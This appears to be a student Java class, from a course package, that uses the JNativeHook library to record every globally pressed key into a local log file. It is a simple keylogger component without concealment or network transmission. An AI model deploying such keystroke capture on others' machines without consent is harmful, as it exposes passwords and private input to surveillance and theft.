package edu.wit.comp2100;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.*;

public class KeyLogger implements NativeKeyListener{

    File keyLogFile;
    FileWriter fileWriter;
    PrintWriter fileInput;

    KeyLogger(File keyLogFile)throws IOException{
        this.keyLogFile = keyLogFile;
        this.fileWriter = new FileWriter(keyLogFile);
        fileInput = new PrintWriter(fileWriter);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
        //do nothing
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
        //write to keyLogFile
        fileInput.append(NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()) + "\n");
        fileInput.flush();

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
        //do nothing
    }

}
